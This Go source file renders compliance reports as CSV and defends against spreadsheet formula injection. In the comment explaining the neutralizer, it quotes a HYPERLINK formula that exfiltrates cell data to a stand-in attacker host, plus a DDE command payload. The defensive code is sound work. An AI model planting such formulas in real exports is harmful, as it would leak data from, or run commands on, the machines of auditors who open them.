// Copyright 2026 AxonFlow
// SPDX-License-Identifier: BUSL-1.1

//go:build enterprise

package renderer

import (
	"bytes"
	"encoding/csv"
	"errors"
	"fmt"
	"strconv"
	"strings"
)

// errNilReport is returned by every renderer when handed a nil model. Shared so
// the four formats cannot disagree about what a nil report means.
var errNilReport = errors.New("renderer: report is nil")

// ErrZeroGeneratedAt is returned when a Report reaches a renderer with no
// generation timestamp.
//
// This is a REFUSAL, not a default, and it is the difference between a
// deterministic artifact and a plausible-looking one (#3241 round 2, H2).
// fpdf treats a zero time as "unset" and stamps the WALL CLOCK into
// /CreationDate and /ModDate, so two renders of the same job one second apart
// produce different bytes and therefore different checksums - measured:
//
//	/CreationDate (D:20260803185338)   run 1
//	/CreationDate (D:20260803185339)   run 2
//
// A checksum that changes on re-render defeats the only thing the checksum is
// for. The reachable path was rbi/auditexport_render.go, where a nil
// ExportMeta left GeneratedAt at its zero value.
//
// Refusing rather than substituting time.Now() (which is what the library
// does) or some sentinel: an artifact whose "generated at" is invented is worse
// than an export that fails loudly, because it is indistinguishable from a real
// one after the fact. The caller has the job record; it is the caller's job to
// supply the timestamp off it.
var ErrZeroGeneratedAt = errors.New("renderer: report has no generation timestamp (GeneratedAt is zero) - " +
	"the renderers must never read the wall clock, so the caller must supply the job record's timestamp")

// validateReport is the shared precondition for every renderer. One function,
// so a new renderer cannot forget a check and so the four formats agree on what
// they refuse.
func validateReport(rep *Report) error {
	if rep == nil {
		return errNilReport
	}
	if rep.GeneratedAt.IsZero() {
		return ErrZeroGeneratedAt
	}
	return nil
}

// CSVRenderer emits a single CSV document containing the identity block and
// every section in order.
//
// A regulator report is not one rectangular table, so the document is
// SECTIONED: a `#` metadata preamble, then per-section `##` banners followed by
// that section's header row and data rows. This is the same shape the RBI audit
// export already writes, so an operator who has opened one recognises the other.
//
// Every record is written through encoding/csv, so a policy name containing a
// comma, a quote or a newline is quoted correctly. The defect this replaces on
// the SEBI plane was the opposite: a JSON body written under a text/csv header,
// which no spreadsheet can open.
type CSVRenderer struct{}

// NewCSV returns a CSV renderer.
func NewCSV() *CSVRenderer { return &CSVRenderer{} }

// ContentType implements Renderer.
func (CSVRenderer) ContentType() string { return "text/csv; charset=utf-8" }

// Extension implements Renderer.
func (CSVRenderer) Extension() string { return "csv" }

// Render implements Renderer.
func (r CSVRenderer) Render(rep *Report) ([]byte, error) {
	if err := validateReport(rep); err != nil {
		return nil, err
	}

	records := [][]string{{"# " + documentTitle(rep)}}
	for _, kv := range headerLines(rep) {
		records = append(records, []string{"# " + kv.Key, kv.Value})
	}

	for i := range rep.Sections {
		s := &rep.Sections[i]
		records = append(records, []string{""})
		records = append(records, []string{"## " + s.Title})
		if s.Description != "" {
			records = append(records, []string{"# " + s.Description})
		}
		for _, n := range s.Notes {
			records = append(records, []string{"# NOTE", n})
		}
		for _, kv := range s.Summary {
			records = append(records, []string{"# " + kv.Key, kv.Value})
		}
		if len(s.Columns) > 0 && len(s.Rows) > 0 {
			records = append(records, s.Columns)
			for _, row := range s.Rows {
				records = append(records, padRow(row, len(s.Columns)))
			}
		}
	}

	// Pad EVERY record to the widest one before writing.
	//
	// A sectioned CSV is naturally ragged: a one-cell banner, a two-cell
	// metadata line, an eight-cell data row. Go's encoding/csv READER pins
	// FieldsPerRecord to the first record and then rejects the file with
	// "wrong number of fields", and it is not alone - plenty of strict parsers
	// do the same. Padding costs a few trailing commas and makes the artifact
	// parse everywhere, which for a file a regulator may feed to their own
	// tooling is the whole point.
	width := 0
	for _, rec := range records {
		if len(rec) > width {
			width = len(rec)
		}
	}
	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	// Explicit: encoding/csv defaults to "\n" (UseCRLF=false). Stating it makes
	// the byte-for-byte contract visible rather than inherited.
	w.UseCRLF = false
	for _, rec := range records {
		if err := w.Write(neutralizeRow(padRow(rec, width))); err != nil {
			return nil, fmt.Errorf("renderer: csv write: %w", err)
		}
	}
	w.Flush()
	if err := w.Error(); err != nil {
		return nil, fmt.Errorf("renderer: csv flush: %w", err)
	}
	return buf.Bytes(), nil
}

// padRow returns a copy of row widened to exactly n cells.
//
// Two callers, two reasons. Within a section it aligns a short data row - a
// trailing optional that formatted to "" and got dropped is the usual cause -
// so the values do not shift left under the wrong headers. Across the document
// it makes every record the same width so a strict reader accepts the file.
//
// Over-long rows are returned UNCHANGED rather than truncated: losing a value
// silently is worse than a wide row, and the document-level pass widens
// everything else to match anyway.
func padRow(row []string, n int) []string {
	if len(row) >= n {
		return row
	}
	out := make([]string, n)
	copy(out, row)
	return out
}

// NeutralizeCSVCell defuses spreadsheet formula injection (CSV injection, M6 of
// the #3241 round-2 record).
//
// EXPORTED because this package is not the only CSV writer that serves
// tenant-controlled strings as text/csv: rbi/auditexport_service.go
// generateCSVFile hand-rolls encoding/csv over the same kind of data. One
// implementation, so the two cannot disagree about what is dangerous.
//
// # Why this matters on THIS artifact specifically
//
// Excel, LibreOffice and Google Sheets treat a cell whose first character is
// `=`, `+`, `-` or `@` as a FORMULA, not as text. A compliance report is built
// from tenant-controlled strings - policy names, violation descriptions,
// reviewer emails, remediation notes - and it is then opened, by a regulator or
// an auditor, in a spreadsheet. So a policy named
//
//	=HYPERLINK("https://attacker.example/?d="&A1,"Click for details")
//
// becomes a live link in the auditor's spreadsheet that exfiltrates the
// neighbouring cell when clicked, and `=cmd|'/c calc'!A0` is the DDE variant.
// The tenant that wrote the policy name is not necessarily the party the report
// is about, and the person opening it is the last one who should absorb that.
//
// # Why a leading apostrophe
//
// It is what the spreadsheet applications themselves emit for text that would
// otherwise parse as a formula, so the round trip is the one they already
// understand: the cell displays the original string and is inert. The
// alternative - stripping or escaping the character - silently alters the
// recorded value, which on an evidence artifact is worse than a visible
// apostrophe.
//
// # The leading-whitespace case
//
// A leading tab, CR or LF is stripped by the parsers before they classify the
// cell, so "\t=1+1" is still a formula. Whitespace is therefore looked past
// when deciding, and the prefix is applied to the original string so nothing is
// lost.
//
// Applied to CSV ONLY.
//
// Not XLSX: measured on the generated workbook, a cell written through
// SetCellStr is stored as a shared STRING (`<c t="s">`), and an XLSX formula
// lives in an `<f>` element that nothing here emits - so no application
// evaluates it, and an apostrophe would just be a visible character in an
// auditor's data. Not PDF or JSON either: neither is a spreadsheet format.
// See the comment at setCell in xlsx.go.
func NeutralizeCSVCell(s string) string {
	trimmed := strings.TrimLeft(s, " \t\r\n")
	if trimmed == "" {
		return s
	}
	switch trimmed[0] {
	case '=', '+', '-', '@':
	default:
		return s
	}
	// A NUMBER is not a formula. `-` and `+` lead every negative and explicitly
	// signed value this report can carry - latency deltas, score changes,
	// signed counts - and prefixing those with an apostrophe would turn real
	// numeric columns into text in the auditor's spreadsheet: no sums, no
	// sorting, and a visible leading quote on data that was never dangerous.
	// That is a corruption of the evidence, which is the thing this function
	// exists to prevent.
	//
	// ParseFloat covers integers, decimals and exponent notation, and it
	// deliberately does NOT accept "=1+1", "-1+1" or "+cmd|..." - anything that
	// is not exactly a number still gets neutralized.
	if _, err := strconv.ParseFloat(trimmed, 64); err == nil {
		return s
	}
	return "'" + s
}

// neutralizeRow returns a copy of row with every cell neutralized.
func neutralizeRow(row []string) []string {
	out := make([]string, len(row))
	for i, c := range row {
		out[i] = NeutralizeCSVCell(c)
	}
	return out
}
